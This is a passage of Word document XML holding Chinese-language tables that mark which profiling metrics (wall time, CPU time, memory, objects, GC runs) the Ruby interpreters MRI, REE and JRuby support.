            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4E9F05CC" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">yes </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="45AE3322" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">no </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="46EC78E4" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">no </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="78E69EFD" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">no </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="426E39C9" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">yes </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="19ABA0D3" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">yes </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="68457918" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">yes </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4C4381A2" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">yes </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004F7237" w14:paraId="080F026F" w14:textId="77777777" w:rsidTr="004F7237">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="709E6119" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve">JRuby </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="06FFFFF6" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">yes </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="260B27DB" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">no </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1504CBD6" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">no </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="740C8AF5" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">yes </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="203BDE61" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">yes </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="33CEEF01" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">yes </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="24B3C2F2" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">yes </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1F4A7FA1" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">yes </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="42DCFF9E" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">1.4.9.2 </w:t>
      </w:r>
      <w:r>
        <w:t>分析测试</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1"/>
        <w:gridCol w:w="937"/>
        <w:gridCol w:w="1201"/>
        <w:gridCol w:w="900"/>
        <w:gridCol w:w="941"/>
        <w:gridCol w:w="808"/>
        <w:gridCol w:w="719"/>
        <w:gridCol w:w="780"/>
        <w:gridCol w:w="800"/>
      </w:tblGrid>
      <w:tr w:rsidR="004F7237" w14:paraId="78B62376" w14:textId="77777777" w:rsidTr="004F7237">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="33471914" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>解释器</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4999F573" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Wall Time</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="326A06CF" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Process Time</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2893F85C" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="caps"/>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>CPU</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> Time</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4FABADFF" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>User Time</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="083F01E8" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Memory</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7438D4D4" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Objects</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4349C805" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>GC Runs</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="008B3D2A" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>GC Time</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004F7237" w14:paraId="13910943" w14:textId="77777777" w:rsidTr="004F7237">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7E7B5057" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="caps"/>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>MRI</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5BC60354" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">yes </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="567A92BE" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">yes </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="375C6C13" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">no </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6FAAE1B4" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">no </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="09A19734" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">yes </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="17324D15" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">yes </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7FC3D207" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">yes </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="165D479D" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">yes </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004F7237" w14:paraId="219477EC" w14:textId="77777777" w:rsidTr="004F7237">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3E1CFDCC" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="caps"/>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>REE</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="79414642" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">yes </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5831594C" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">yes </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="783B943E" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">no </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="20B31459" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">no </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="11205DB2" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">yes </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="21B73475" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">yes </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0C64283A" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
